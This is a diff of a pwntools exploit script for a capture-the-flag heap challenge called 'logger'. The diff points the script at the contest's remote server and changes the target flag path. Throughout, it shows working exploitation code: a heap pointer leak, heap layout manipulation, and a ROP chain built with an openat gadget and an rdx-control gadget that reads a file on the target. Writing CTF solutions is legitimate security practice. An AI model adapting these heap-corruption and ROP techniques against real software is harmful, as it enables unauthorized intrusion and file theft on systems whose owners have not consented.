@@ -5,7 +5,8 @@ from pwn import *
 context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
 
-r = process('./test', aslr=False)
+# r = process('./logger', aslr=False)
+r = remote('chals1.eof.ais3.org', 45125)
 
 def new(idx, _len, msg):
     r.sendlineafter('> ', '1')
@@ -22,21 +23,10 @@ def show(idx):
     r.sendlineafter('> ', '3')
     r.sendlineafter('idx: ', str(idx))
 
-def edit(name, namelen, idx, msg):
+def edit(idx, msg):
     r.sendlineafter('> ', '4')
-
-    if namelen == 0:
-        r.sendlineafter("edit name (y/n): ", 'n')
-    else:
-        r.sendlineafter("edit name (y/n): ", 'y')
-        get_name(name, namelen)
-
-    if idx == -1:
-        r.sendlineafter("edit log (y/n): ", 'n')
-    else:
-        r.sendlineafter("edit log (y/n): ", 'y')
-        r.sendlineafter('idx: ', str(idx))
-        r.sendafter('msg: ', msg)
+    r.sendlineafter('idx: ', str(idx))
+    r.sendafter('msg: ', msg)
 
 def get_name(name, namelen):
     r.sendlineafter('len: ', str(namelen))
@@ -55,7 +45,6 @@ show(0)
 r.recvuntil('msg: ')
 heap = u64(r.recv(6).ljust(8, b'\x00')) - 0xfb0
 info(f"heap: {hex(heap)}")
-
 
 edit(0, p64(heap + 0xff0) + b'\n')
 new(1, 0xf8, '\n')
@@ -126,7 +115,7 @@ rop = flat(
     heap + 0x1000 + 0x8, rop_openat, # 0xa0
 )
 new(5, 0xb8, rop + b'\n') # heap + 0x1000
-new(6, 0xb8, p64(control_rdx_gadget) + p64(heap + 0x1000 - 0x20) + b'/tmp/flag\x00' + b'\n')
+new(6, 0xb8, p64(control_rdx_gadget) + p64(heap + 0x1000 - 0x20) + b'/home/logger/flag\x00' + b'\n')
 
 delete(6)
 r.interactive()
